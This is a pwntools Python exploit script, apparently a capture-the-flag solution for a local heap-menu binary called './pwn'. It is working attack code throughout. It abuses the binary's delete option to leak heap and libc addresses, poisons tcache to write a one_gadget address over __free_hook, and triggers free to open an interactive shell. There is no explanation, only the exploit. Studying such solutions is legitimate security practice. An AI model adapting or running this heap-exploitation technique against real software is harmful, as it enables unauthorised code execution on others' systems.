from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[32m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Your choice:'
def add(content):
	sla(menu, b'1')
	sda(b'content:', content)

def edit(idx, content):
	sla(menu, b'2')
	sla(b'idx:', byte(idx))
	sda(b'content:', content)

def dele(idx, clear = b'n'):
	sla(menu, b'3')
	sla(b'idx:', byte(idx))
	sla(b'):', clear)

def show(idx):
	sla(menu, b'4')
	sla(b'idx:', byte(idx))

add(b'0\n')  # 0
pay = b'\x00'*0x30 + p64(0) + p64(0x11)
add(pay)     # 1
dele(1, b'y')  # 1 
dele(0)
show(0)
rut(b'Content:')
heap_base = addr64(b'\n') - 0x2b0
info("heap_base", heap_base)
for i in range(5):
	dele(0)
dele(0, b'y')   # 0
pay = p64(heap_base+0x250-0x10)
add(pay)     # 0
add(b'1\n')  # 1
dele(0, b'y')   # 0
pay = p64(0) + p64(0x91)
add(pay)     # 0
for i in range(8):
	dele(1)
show(1)
rut(b'Content:')
libc.address = addr64(b'\n') - 0x3ebca0
info("libc_base", libc.address)
free_hook = libc.sym.__free_hook
ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]
pay = p64(0) + p64(0x51)
edit(0, pay)
dele(1, b'y')
pay = p64(0) + p64(0x51) + p64(free_hook)
edit(0, pay)
add(b'1\n')
pay = p64(0) + p64(0x61)
edit(0, pay)
dele(1, b'y')
add(p64(ones[1]))
sla(menu, b'3')
sla(b'idx:', b'1')
#debug()
sh()
